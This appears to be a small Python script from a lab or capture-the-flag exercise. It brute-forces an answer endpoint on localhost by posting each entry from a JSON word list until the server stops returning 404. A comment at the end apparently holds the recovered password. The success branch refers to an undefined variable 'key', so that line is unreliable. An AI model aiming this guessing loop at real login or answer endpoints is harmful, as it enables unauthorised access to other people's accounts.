from urllib import request
import requests as req
import json

def main():
    with open("wordlist.json") as json_file:
        wordlist = json.load(json_file)
    brute(wordlist)


def brute(wordlist):
    url = "http://localhost:5000/ovi/"
    with req.Session() as session:
        for i in range(10000, 1, -1):
            print("Word: ", wordlist[str(i)], " key num: ", i)
            r = session.post(url=url, json={"answer":wordlist[str(i)]})
            if r.status_code != 404:
                print("SUCCESS")
                print("Pass: ", wordlist[key])
                return

if __name__=="__main__":
    main()
    #V4apUkk4m3Hu